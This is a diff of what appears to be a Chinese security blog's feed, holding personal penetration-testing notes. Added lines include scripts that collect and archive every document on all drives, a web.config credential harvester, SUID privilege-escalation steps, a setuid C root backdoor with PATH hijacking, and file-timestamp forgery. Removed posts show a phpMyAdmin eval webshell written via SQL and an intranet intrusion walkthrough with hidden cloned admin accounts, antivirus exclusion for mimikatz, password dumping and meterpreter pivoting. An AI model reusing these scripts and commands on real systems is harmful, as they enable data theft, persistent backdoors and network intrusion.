+   find /r 目录名 %变量名 in (匹配模式1,匹配模式2) do 命令  eg:echo &quot;yes&quot; | for /r f:&lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;%i in (&lt;span class=&quot;ge&quot;&gt;*.doc,*&lt;/span&gt;.docx,&lt;span class=&quot;ge&quot;&gt;*.pdf,*&lt;/span&gt;.xls,&lt;span class=&quot;ge&quot;&gt;*.xlsx,*&lt;/span&gt;.txt) do copy &quot;%i&quot; f:&lt;span class=&quot;se&quot;&gt;\w&lt;/span&gt;eb_r
    E:&lt;span class=&quot;se&quot;&gt;\R&lt;/span&gt;ECYCLER&lt;span class=&quot;se&quot;&gt;\R&lt;/span&gt;ar.exe a -k -r -s -m1 E:&lt;span class=&quot;se&quot;&gt;\w&lt;/span&gt;wwroot&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;eb&lt;span class=&quot;se&quot;&gt;\w&lt;/span&gt;eb.rar E:&lt;span class=&quot;se&quot;&gt;\w&lt;/span&gt;wwroot&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;eb&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;
+   7z.exe a -t7z -p123456 c:&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;est.7z c:&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;est&lt;span class=&quot;se&quot;&gt;\*&lt;/span&gt;.&lt;span class=&quot;err&quot;&gt;*&lt;/span&gt;
    del /f/q folder
    rar a /v20m /m0 newfilename web.rar
    windows find web.config==&amp;gt;for /r c:&lt;span class=&quot;se&quot;&gt;\h&lt;/span&gt;ttp&lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;%i in (web.conf?g) do (echo &lt;span class=&quot;gs&quot;&gt;****&lt;/span&gt;&lt;span class=&quot;ge&quot;&gt;*filepath*&lt;/span&gt;&lt;span class=&quot;gs&quot;&gt;****&lt;/span&gt; &amp;gt;&amp;gt; tmp.txt &amp;amp;&amp;amp; echo %i &amp;gt;&amp;gt; tmp.txt &amp;amp;&amp;amp; type &quot;%i&quot; &amp;gt;&amp;gt; tmp.txt &amp;gt;&amp;gt; tmp.txt &amp;amp;&amp;amp; echo. &amp;gt;&amp;gt; tmp.txt)
    windows bat批处理for用法：http://blog.csdn.net/wh_19910525/article/details/7912440
 
    findstr /R &quot;.&lt;span class=&quot;ge&quot;&gt;*sa.*&lt;/span&gt;&quot; c:&lt;span class=&quot;se&quot;&gt;\1\*&lt;/span&gt; &amp;gt; tmp.txt
-&lt;span class=&quot;p&quot;&gt;41.&lt;/span&gt;kali linux2.0 import folder path:/usr/share/applications   eg.gnome-control-center network
+   powershell:dir –r | select-string &quot;root&quot;
+
+   windows打包(7z)命令：1.bat
+   ---------------content of 1.bat--------------------------
+    @echo off
+    goto :main
+    这是注释：(for /f &quot;delims=&quot;的作用为取消默认的以空格等符号作为分割符
+    dir /s 实现了linux中的find功能，for /r path %%i in (web.conf?g) do ... 也可以实现find功能，但是自己实现时发现for /r path ...中的path只能是一个具体路径，不能是变量，这样就不能遍历全部磁盘了)
+    :main
+    set str=c d e f g h i j k l m n o p q r s t u v w x y z 
+    rd /s/q c:&lt;span class=&quot;se&quot;&gt;\r&lt;/span&gt;ecycler&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;mp
+    md c:&lt;span class=&quot;se&quot;&gt;\r&lt;/span&gt;ecycler&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;mp
+    echo  当前硬盘的分区有： 
+    for %%i in (%str%) do (
+    if exist %%i: (echo %%i:
+    
+    for /f &quot;delims=&quot; %%j in (&#39;dir /b /s &quot;%%i:&lt;span class=&quot;se&quot;&gt;\*&lt;/span&gt;.doc&quot;&#39;) do (
+    echo &quot;yes&quot; | copy &quot;%%j&quot; c:&lt;span class=&quot;se&quot;&gt;\r&lt;/span&gt;ecycler&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;mp
+    echo %%j &amp;gt;&amp;gt; tmp.txt
+    )
+    
+    for /f &quot;delims=&quot; %%j in (&#39;dir /b /s &quot;%%i:&lt;span class=&quot;se&quot;&gt;\*&lt;/span&gt;.docx&quot;&#39;) do (
+    echo &quot;yes&quot; | copy &quot;%%j&quot; c:&lt;span class=&quot;se&quot;&gt;\r&lt;/span&gt;ecycler&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;mp
+    echo %%j &amp;gt;&amp;gt; c:&lt;span class=&quot;se&quot;&gt;\r&lt;/span&gt;ecycler&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;mp&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;mp.txt
+    )
+    
+    
+    for /f &quot;delims=&quot; %%j in (&#39;dir /b /s &quot;%%i:&lt;span class=&quot;se&quot;&gt;\*&lt;/span&gt;.pdf&quot;&#39;) do (
+    echo &quot;yes&quot; | copy &quot;%%j&quot; c:&lt;span class=&quot;se&quot;&gt;\r&lt;/span&gt;ecycler&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;mp
+    echo %%j &amp;gt;&amp;gt; c:&lt;span class=&quot;se&quot;&gt;\r&lt;/span&gt;ecycler&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;mp&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;mp.txt
+    )
+    
+    
+    for /f &quot;delims=&quot; %%j in (&#39;dir /b /s &quot;%%i:&lt;span class=&quot;se&quot;&gt;\*&lt;/span&gt;.txt&quot;&#39;) do (
+    echo &quot;yes&quot; | copy &quot;%%j&quot; c:&lt;span class=&quot;se&quot;&gt;\r&lt;/span&gt;ecycler&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;mp
+    echo %%j &amp;gt;&amp;gt; c:&lt;span class=&quot;se&quot;&gt;\r&lt;/span&gt;ecycler&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;mp&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;mp.txt
+    )
+    
+    
+    for /f &quot;delims=&quot; %%j in (&#39;dir /b /s &quot;%%i:&lt;span class=&quot;se&quot;&gt;\*&lt;/span&gt;.xls&quot;&#39;) do (
+    echo &quot;yes&quot; | copy &quot;%%j&quot; c:&lt;span class=&quot;se&quot;&gt;\r&lt;/span&gt;ecycler&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;mp
+    echo %%j &amp;gt;&amp;gt; c:&lt;span class=&quot;se&quot;&gt;\r&lt;/span&gt;ecycler&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;mp&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;mp.txt
+    )
+    
+    
+    for /f &quot;delims=&quot; %%j in (&#39;dir /b /s &quot;%%i:&lt;span class=&quot;se&quot;&gt;\*&lt;/span&gt;.xlsx&quot;&#39;) do (
+    echo &quot;yes&quot; | copy &quot;%%j&quot; c:&lt;span class=&quot;se&quot;&gt;\r&lt;/span&gt;ecycler&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;mp
+    echo %%j &amp;gt;&amp;gt; c:&lt;span class=&quot;se&quot;&gt;\r&lt;/span&gt;ecycler&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;mp&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;mp.txt
+    )
+    
+    
+    )
+    )
+    
+    7z a -t7z C:&lt;span class=&quot;se&quot;&gt;\r&lt;/span&gt;ecycler&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;mp&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;est.7z C:&lt;span class=&quot;se&quot;&gt;\r&lt;/span&gt;ecycler&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;mp&lt;span class=&quot;se&quot;&gt;\*&lt;/span&gt;.&lt;span class=&quot;err&quot;&gt;*&lt;/span&gt;
+    ------------------end--------------------------------&lt;span class=&quot;sb&quot;&gt;
+
+    linux打包命令：1.sh(attention:without &quot;&amp;amp;&amp;amp; echo ok&quot;,the final tar -T xlsx.list -czf xlsx.tar.gz will fail)
+    -----------------content of 1.sh--------------------
+    mkdir /tmp/tmp &amp;amp;&amp;amp; find / -name &quot;*.doc&quot; &amp;gt; /tmp/tmp/doc.list &amp;amp;&amp;amp; find / -name &quot;*.docx&quot; &amp;gt; /tmp/tmp/docx.list &amp;amp;&amp;amp; find / -name &quot;*.pdf&quot; &amp;gt; /tmp/tmp/pdf.list &amp;amp;&amp;amp; find / -name &quot;*.txt&quot; &amp;gt; /tmp/tmp/txt.list &amp;amp;&amp;amp; find / -name &quot;*.xls&quot; &amp;gt; /tmp/tmp/xls.list &amp;amp;&amp;amp; find / -name &quot;*.xlsx&quot; &amp;gt; /tmp/tmp/xlsx.list &amp;amp;&amp;amp; tar -T /tmp/tmp/doc.list -czf /tmp/tmp/doc.tar.gz &amp;amp;&amp;amp; tar -T /tmp/tmp/docx.list -czf /tmp/tmp/docx.tar.gz &amp;amp;&amp;amp; tar -T /tmp/tmp/pdf.list -czf /tmp/tmp/pdf.tar.gz &amp;amp;&amp;amp; tar -T /tmp/tmp/txt.list -czf /tmp/tmp/txt.tar.gz &amp;amp;&amp;amp; tar -T /tmp/tmp/xls.list -czf /tmp/tmp/xls.tar.gz &amp;amp;&amp;amp; tar -T /tmp/tmp/xlsx.list -czf /tmp/tmp/xlsx.tar.gz &amp;amp;&amp;amp; echo ok
+    --------------------end-----------------------------
+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;41.&lt;/span&gt;kali linux2.0 import folder path:/usr/share/applications   eg.gnome-control-center network
 &lt;span class=&quot;p&quot;&gt;42.&lt;/span&gt;http://www.orico.com.cn/   driver    
 &lt;span class=&quot;p&quot;&gt;43.&lt;/span&gt;python中单引号，双引号，三引号http://blog.csdn.net/caianye/article/details/6638183       
 &lt;span class=&quot;p&quot;&gt;44.&lt;/span&gt;mygoogle dork：
@@ -1899,7 +2314,7 @@ input your number here:&#39;&#39;&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&
    2&amp;gt;Tor-Browser洋葱浏览器自带tor，每次启动tor-browser时，它会启动它自带的tor，该tor默认端口是9150（老版本的是9050）
    3&amp;gt;1中的tor和2中的tor功能完全一样，proxychains firefox等程序时对应的proxychains.conf里面的端口为9050，启动tor-browser浏览器后可用也可将proxychains.conf中端口改为9150,但tor-browser关闭后proxychains这样的代理设置会失效。
 &lt;span class=&quot;p&quot;&gt;50.&lt;/span&gt;Python Unicode与中文处理:http://my.oschina.net/u/201886/blog/64692
-&lt;span class=&quot;p&quot;&gt;51.&lt;/span&gt;内网渗透https://www.91ri.org/tag/neiwang-hacker
+&lt;span class=&quot;p&quot;&gt;51.&lt;/span&gt;shadow copy神器，可以复制使用中的文件，可拷贝数据库
 &lt;span class=&quot;p&quot;&gt;52.&lt;/span&gt;php中的header()函数 http://www.cnblogs.com/fengzheng126/archive/2012/04/21/2461475.html
 &lt;span class=&quot;p&quot;&gt;53.&lt;/span&gt;php中{}的功能 http://zhidao.baidu.com/link?url=KTLBf6o36tO9J0elyLbbVpdL9F-uD_Js4X2hwQq5EzinT2L3ba_Xq-esopPYkTiszNpXR2HposrabwqCx3VXRq
 &lt;span class=&quot;p&quot;&gt;54.&lt;/span&gt;php上传中%00截断的理解：
@@ -2204,6 +2619,13 @@ input your number here:&#39;&#39;&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&
              http://www.1990day.com/regeorg-proxychains-gold-partner/
              http://www.codersec.net/%E5%AF%B9%E5%9B%BD%E5%A4%96%E6%9F%90%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%9A%84%E4%B8%80%E6%AC%A1%E5%B0%8F%E7%BB%93/
              http://netsecurity.51cto.com/art/201602/506072.htm 使用Quarks PwDump获取域控密码
+             https://www.91ri.org/tag/neiwang-hacker
+             http://drops.wooyun.org/tips/6617   导出当前域内所有用户hash的技术整理
+             http://www.objectif-securite.ch/ophcrack.php   windows hashes crack
+   快速找出dc:
+            dsquery server(best)
+            nslookup -type=SRV _ldap._tcp.baidu.com
+            netdom query fsmo
 &lt;span class=&quot;p&quot;&gt;88.&lt;/span&gt;ipc$:http://www.cnblogs.com/lhws/p/4024208.htm
 &lt;span class=&quot;p&quot;&gt;89.&lt;/span&gt;github pages+jekyll搭建个人博客：
         https://www.zhihu.com/question/20223939
@@ -2256,6 +2678,7 @@ input your number here:&#39;&#39;&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&
                                     Shift_L: commit_code
                                     Shift_R: inline_ascii
                       --------------------end----------------------------
+    windows中rime词库文件位置：%APPDATA%&lt;span class=&quot;se&quot;&gt;\r&lt;/span&gt;ime
 &lt;span class=&quot;p&quot;&gt;93.&lt;/span&gt;windows download:https://www.microsoft.com/en-us/search/result.aspx?q=windows+xp+professional+x64+edition&amp;amp;form=MSHOME
 &lt;span class=&quot;p&quot;&gt;94.&lt;/span&gt;backdoor-factory用法:
 &lt;span class=&quot;p&quot;&gt;    1.&lt;/span&gt;单独的backdoor-factory:backdoor-factory -f /root/Desktop/putty.exe -S (check if the putty.exe is support for backdoor-factory)
@@ -2273,6 +2696,60 @@ input your number here:&#39;&#39;&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&
     &lt;span class=&quot;nt&quot;&gt;&amp;lt;/configuration&amp;gt;&lt;/span&gt;
    --------------------------end of content----------------
    then upon a strong webshell to my new created folder,found no more error.
+&lt;span class=&quot;p&quot;&gt;96.&lt;/span&gt;百度云上传限制绕过:copy 1.rmvb /b + hunxiao.txt /a 1-hunxiao-txt.rmvb
+&lt;span class=&quot;p&quot;&gt;97.&lt;/span&gt;windows中ping google &amp;amp;&amp;amp; ping baidu ==&amp;gt;ping.bat:
+                                         cmd /k &quot;ping www.google.com.hk &amp;amp;&amp;amp; ping www.baidu.com&quot;
+   创建ping.bat文件的快捷方式，在快捷方式中添加快捷键.eg.ctrl+alt+p
+&lt;span class=&quot;p&quot;&gt;98.&lt;/span&gt;linux开启http代理:service squid3 status,service squid3 start,vi /etc/squid3/squid3.conf
+&lt;span class=&quot;p&quot;&gt;99.&lt;/span&gt;booklist:http://www.jianshu.com/p/67e294106919
+&lt;span class=&quot;p&quot;&gt;100.&lt;/span&gt;gdb:http://www.jianshu.com/p/f20b10ea9a61
+&lt;span class=&quot;p&quot;&gt;101.&lt;/span&gt;study links:
+    http://www.shiyanbar.com/questions/733
+    http://ch3rish.lofter.com/post/1d503b96_791362d
+&lt;span class=&quot;p&quot;&gt;102.&lt;/span&gt;linux中suid,sgid,sticky详解：http://crazyming.blog.51cto.com/1048571/467414
+    find / -type f -perm -4000 -ls &amp;gt; tmp.txt   function:find suid files
+        find / -type f -perm -4000 -ls | grep &quot;flag00&quot; &amp;gt; tmp.txt    function:find file has setuid=flag00
+    find / -type f -perm -2000 -ls &amp;gt; tmp.txt   function:find sgid files
+    find / -perm -2 -type f -print             function:find files can be writeable by everyone
+        echo &quot;/bin/cp /bin/sh /tmp/.sh;chmod 4755 /tmp/.sh&quot; &amp;gt;&amp;gt; writeable_file_if_it_is_from_any_autorun_directory
+        /tmp/.sh -p(this command to get a euid=root shell)
+&lt;span class=&quot;p&quot;&gt;103.&lt;/span&gt;linux中好用的find命令:http://www.oschina.net/translate/15-practical-unix-linux-find-command-examples-part-2?print
+&lt;span class=&quot;p&quot;&gt;104.&lt;/span&gt;one linux backdoor shell can be like this:(file.c)
+    #include &lt;span class=&quot;nt&quot;&gt;&amp;lt;stdlib&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;h&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+    #include &lt;span class=&quot;nt&quot;&gt;&amp;lt;unistd&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;h&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+    #include &lt;span class=&quot;nt&quot;&gt;&amp;lt;string&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;h&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+    #include &lt;span class=&quot;nt&quot;&gt;&amp;lt;sys&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;types&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;h&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+    #include &lt;span class=&quot;nt&quot;&gt;&amp;lt;stdio&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;h&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+    
+    int main(int argc, char &lt;span class=&quot;gs&quot;&gt;**argv, char **&lt;/span&gt;envp)
+    {
+    	gid_t gid;
+    	uid_t uid;
+    	gid = getegid();
+    	uid = geteuid();
+    
+    	setresgid(gid, gid, gid);
+    	setresuid(uid, uid, uid);
+    
+    	system(&quot;/usr/bin/env echo &amp;amp;&amp;amp; echo runtime error.&quot;);
+    }&lt;span class=&quot;sb&quot;&gt;
+
+    to use this file as a root shell backdoor after got a root shell,
+    use root role execute:
+        gcc -o 1 file.c
+        mv 1 /bin/l2ping
+        chmod 4755 /bin/l2ping(or in common user: sudo chown root /bin/l2ping;sudo chmod +s /bin/l2ping)
+    use webshell role execute:
+        PATH=/tmp:$PATH
+        export PATH
+        echo $PATH(to check if /tmp is in $PATH)
+        ln -s /bin/sh /tmp/echo
+    then use webshell role to get a root privilege shell:
+        /bin/l2ping
+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;105.&lt;/span&gt;linux中修改文件时间
+    同时修改文件的修改时间和访问时间
+    touch -d &quot;2010-05-31 08:10:30&quot; test.doc
+&lt;span class=&quot;p&quot;&gt;106.&lt;/span&gt;rime全角到半角解决方法:如果主机突然变成全角而无法变回半角，从任意地方中复制一个正常的半角字符串到主机中任意地方即可，不用重启
 &lt;/code&gt;&lt;/pre&gt;
 &lt;/div&gt;
 </description>
@@ -2347,223 +2824,6 @@ input your number here:&#39;&#39;&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&
         
         
         <category>python</category>
-        
-      </item>
-    
-      <item>
-        <title>phpmyadmin独家技能</title>
-        <description>&lt;h3 id=&quot;x01-base&quot;&gt;0x01 Base&lt;/h3&gt;
-
-&lt;h4 id=&quot;website-has-phpmyadmin&quot;&gt;1&amp;gt;website has phpmyadmin&lt;/h4&gt;
-
-&lt;h4 id=&quot;phpmyadmin-can-be-logined-by-anyone-without-password&quot;&gt;2&amp;gt;phpmyadmin can be logined by anyone without password&lt;/h4&gt;
-
-&lt;h4 id=&quot;the-strongtblsqlphpstrong-has-been-deleted-by-website-manager-or-someone-else&quot;&gt;3&amp;gt;the &lt;strong&gt;tbl_sql.php&lt;/strong&gt; has been deleted by website manager or someone else&lt;/h4&gt;
-
-&lt;h3 id=&quot;x02-about&quot;&gt;0x02 About&lt;/h3&gt;
-
-&lt;h4 id=&quot;the-web-server-runs-phpmyadminbut-with-wrong-setupmakes-it-possible-for-anyone-to-logined-in-phpmyadmin-without-passwordand-able-to-read-the-root-password&quot;&gt;The web server runs phpmyadmin,but with wrong setup,makes it possible for anyone to logined in phpmyadmin without password,and able to read the root password.&lt;/h4&gt;
-
-&lt;h4 id=&quot;there-are-two-filesstrong-tblsqlphpsqlphpstrong-generallytblsqlphp-has-execute-sqlquery-function-like-below-picture-at-arrow-1sqlphp-has-view-sql-database-function-like-below-picture-at-arrow-2&quot;&gt;There are two files:&lt;strong&gt; tbl_sql.php,sql.php&lt;/strong&gt;. Generally,tbl_sql.php has execute sqlquery function like below picture at arrow 1,sql.php has view sql database function like below picture at arrow 2.&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;../../../../../pic/phpmyadmin/phpmyadmin160413.png&quot; /&gt;&lt;br /&gt;&lt;/p&gt;
-
-&lt;h4 id=&quot;generallywhen-we-want-to-execute-sql-query-like&quot;&gt;generally,when we want to execute sql query like&lt;/h4&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;select&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&#39;&amp;lt;? php @eval($_POST[cmd]);?&amp;gt;&#39;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;into&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dumpfile&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&#39;/var/www/1.php&#39;&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;or&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;select&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x3c3f2070687020406576616c28245f504f53545b636d645d293b3f3e&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;into&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dumpfile&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&#39;/var/www/1.php&#39;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;h4 id=&quot;we-will-find-this-does-not-work-here-coz-tblsqlphp-was-deletedit-works-out-like-below-404-error-when-i-try-to-execute-above-query&quot;&gt;we will find this does not work here coz tbl_sql.php was deleted.It works out like below 404 error when I try to execute above query:&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;../../../../../pic/phpmyadmin/phpmyadmin160413_2.png&quot; /&gt;&lt;/p&gt;
-
-&lt;h3 id=&quot;x03-exploit&quot;&gt;0x03 Exploit&lt;/h3&gt;
-
-&lt;h4 id=&quot;use-strongsqlphpstrong-to-execute-sqlquery&quot;&gt;&amp;gt; use &lt;strong&gt;sql.php&lt;/strong&gt; to execute sqlquery&lt;/h4&gt;
-
-&lt;h4 id=&quot;usage&quot;&gt;&amp;gt; usage:&lt;/h4&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://xx.xx.xx/phpmyadmin/sql.php?xxx=xxx...&amp;amp;sql_query=[sqli]
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;h4 id=&quot;sqli-is-sqlquery-sentence-been-urlencoded&quot;&gt;&amp;gt; [sqli] is sqlquery sentence been urlencoded.&lt;/h4&gt;
-
-&lt;h4 id=&quot;egsqlqueryselect20version&quot;&gt;&amp;gt; eg.sql_query=select%20@@version&lt;/h4&gt;
-
-&lt;p&gt;&lt;em&gt;detail&lt;/em&gt;:&lt;/p&gt;
-
-&lt;h4 id=&quot;use-burpsuite-listening-browsers-postget-request-parameters-when-clicking-any-table-name-like-below&quot;&gt;1&amp;gt;use burpsuite listening browser’s post|get request parameters when clicking any table name like below:&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;../../../../../pic/phpmyadmin/phpmyadmin160413_3.png&quot; /&gt;&lt;/p&gt;
-
-&lt;h4 id=&quot;add-add-get-request-parameter-sqlqueryselect20version&quot;&gt;2&amp;gt;add add get request parameter &lt;em&gt;sql_query=select%20@@version&lt;/em&gt;&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;../../../../../pic/phpmyadmin/phpmyadmin160413_4.png&quot; /&gt;&lt;/p&gt;
-
-&lt;h4 id=&quot;find-sqli-has-been-execute&quot;&gt;3&amp;gt;find sqli has been execute&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;../../../../../pic/phpmyadmin/phpmyadmin160413_5.png&quot; /&gt;&lt;/p&gt;
-
-</description>
-        <pubDate>Tue, 12 Apr 2016 00:00:00 +0800</pubDate>
-        <link>/web/2016/04/12/phpmyadmin%E7%8B%AC%E5%AE%B6%E6%8A%80%E8%83%BD/</link>
-        <guid isPermaLink="true">/web/2016/04/12/phpmyadmin%E7%8B%AC%E5%AE%B6%E6%8A%80%E8%83%BD/</guid>
-        
-        <category>web</category>
-        
-        <category>phpmyadmin</category>
-        
-        
-        <category>web</category>
-        
-      </item>
-    
-      <item>
-        <title>Inside network in workgroup</title>
-        <description>&lt;h3 id=&quot;x01-base&quot;&gt;0x01 Base&lt;/h3&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;got a webshell of xxx.xxx.xxx.101(run aspx)  
-don&#39;t know how to get system shell from this webshell  
-there exists not only one site on xxx.xxx.xxx.101  
-find xxx.xxx.xxx.101 has another address 10.10.10.101
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;h3 id=&quot;x02-steps&quot;&gt;0x02 Steps&lt;/h3&gt;
-
-&lt;h4 id=&quot;search-webconfig-on-all-sites-to-find-sa-and-sapass&quot;&gt;1&amp;gt;search web.config on all sites to find sa and sapass&lt;/h4&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1.bat
-@echo off
-goto :main
-这是注释：(for /f &quot;delims=&quot;的作用为取消默认的以空格等符号作为分割符
-dir /s 实现了linux中的find功能，for /r path %%i in (web.conf?g) do ... 也可以实现find功能，但是自己实现时发现for /r path ...中的path只能是一个具体路径，不能是变量，这样就不能遍历全部磁盘了)
-:main
-set str=c d e f g h i j k l m n o p q r s t u v w x y z 
-echo  当前硬盘的分区有： 
-for %%i in (%str%) do (
-if exist %%i: (echo %%i:
-for /f &quot;delims=&quot; %%j in (&#39;dir /b /s &quot;%%i:\web.conf?g&quot;&#39;) do (
-echo *****filepath***** &amp;gt;&amp;gt; tmp.txt
-echo %%j &amp;gt;&amp;gt; tmp.txt
-type &quot;%%j&quot; &amp;gt;&amp;gt; tmp.txt
-echo. &amp;gt;&amp;gt; tmp.txt
-echo ---------------------------- &amp;gt;&amp;gt; tmp.txt
-echo 我是美丽的分割线 &amp;gt;&amp;gt; tmp.txt
-echo ---------------------------- &amp;gt;&amp;gt; tmp.txt
-echo. &amp;gt;&amp;gt; tmp.txt
-)
-)
-)
-
-2.vbs
-Set ws = CreateObject(&quot;Wscript.Shell&quot;)
-ws.run &quot;cmd /c 1.bat&quot;,vbhide
-
-cscript 2.vbs
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;h5 id=&quot;or-download-fromhttpsgithubcomxinghuacaibattreemastergetwebconfigbat&quot;&gt;or download from:&lt;code class=&quot;highlighter-rouge&quot;&gt;https://github.com/xinghuacai/bat/tree/master/get_web_config_bat&lt;/code&gt;&lt;/h5&gt;
-
-&lt;h4 id=&quot;find-sa-and-sapass-of-1010101but-as-a-inside-network-pc3389-is-not-allowed-from-outside&quot;&gt;[+] find sa and sapass of 10.10.10.1,but as a inside network pc,3389 is not allowed from outside&lt;/h4&gt;
-
-&lt;h4 id=&quot;upload-a-tunnelaspxfrom-regeorg-to--xxxxxxxxx101&quot;&gt;2&amp;gt;upload a tunnel.aspx(from reGeorg) to  xxx.xxx.xxx.101&lt;/h4&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[python] reGeorg.py -p 1080 -u http://xxx.xxx.xxx.101/xx/tunnel.aspx
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;h4 id=&quot;use-sa-pri-in-chopper-execute&quot;&gt;3&amp;gt;use sa pri in chopper execute:&lt;/h4&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;net user tmp /add &amp;amp; net localgroup administrators tmp /add  
-net localgroup &quot;remote desktop users&quot; tmp /add
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;h4 id=&quot;runas-admin-cmd--mstsc-console-v1010101--admin&quot;&gt;4&amp;gt;runas admin-&amp;gt;cmd-&amp;gt; mstsc /console /v:10.10.10.1 -admin&lt;/h4&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[10.10.10.1:3389 with tmp account]:  
-add a superhide administrator account cloned from administrator account:  
-net user tmp$ /add &amp;amp; net localgroup administrators tmp$ /add
-regedit-&amp;gt;local machine-&amp;gt;sam-&amp;gt;account-&amp;gt;name
-export 0x111&amp;lt;assume as administrator&#39;s&amp;gt; as admin.reg
-export 0x222&amp;lt;assume as tmp$&#39;s&amp;gt; as user.reg
-export account-&amp;gt;name-&amp;gt;tmp$ as tmp.reg
-copy /F value from admin.reg to user.reg
-net user tmp$ /del
-import tmp.reg and user.reg
-delete admin.reg,user.reg,tmp.reg
-logoff
-
-[10.10.10.1:3389 with tmp$ account]:  
-net user tmp /del
-open setup of eset to add exclude file path
-copy \\tsclient\mimikatz\ exclude_folder
-
-[run mimikatz]:  
-privilege::debug
-sekurlsa::logonpasswords
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;h4 id=&quot;upload-a-meterpreter-payload-to-1010101&quot;&gt;5&amp;gt;upload a meterpreter payload to 10.10.10.1&lt;/h4&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;meterpreter&amp;gt;run get_local_subnets
-            10.0.0.0/255.0.0.0
-meterpreter&amp;gt;background
-(handler)&amp;gt;route add 10.0.0.0 255.0.0.0 1
-(handler)&amp;gt;route print
